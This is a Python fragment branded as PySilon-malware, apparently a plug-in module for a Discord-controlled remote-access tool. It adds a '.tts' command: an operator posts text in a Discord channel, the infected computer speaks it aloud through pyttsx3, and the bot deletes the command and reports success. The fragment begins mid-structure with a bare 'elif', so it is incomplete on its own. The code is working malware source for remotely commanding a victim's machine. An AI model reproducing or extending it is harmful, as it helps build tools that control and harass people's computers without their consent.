import pyttsx3

# Function to parse TTS command
def parse_tts_command(command):
    tokens = command.split()
    gender = None
    speed = None
    pitch = None

    if len(tokens) >= 2:
        if tokens[1] == 'boy':
            gender = 'male'
        elif tokens[1] == 'girl':
            gender = 'female'

    if len(tokens) >= 3:
        try:
            speed = float(tokens[2])
        except ValueError:
            pass

    if len(tokens) >= 4:
        try:
            pitch = float(tokens[3])
        except ValueError:
            pass

    return gender, speed, pitch

# on message
elif message.content.startswith('.tts'):
    await message.delete()
    tts_command = message.content.strip()[5:]
    
    if not tts_command:
        embed = discord.Embed(title="📛 Error", description='```Syntax: .tts <what-to-say> [boy/girl] [speed] [pitch]```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        requested_tts = tts_command.split(maxsplit=1)[1]
        gender, speed, pitch = parse_tts_command(tts_command)

        engine = pyttsx3.init()

        if gender:
            engine.setProperty('voice', f'{gender}_english')
        if speed:
            engine.setProperty('rate', speed)
        if pitch:
            engine.setProperty('pitch', pitch)

        engine.say(requested_tts)
        engine.runAndWait()
        engine.stop()

        embed = discord.Embed(title="🟢 Success", description=f'```Successfully played TTS message: "{requested_tts}"```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
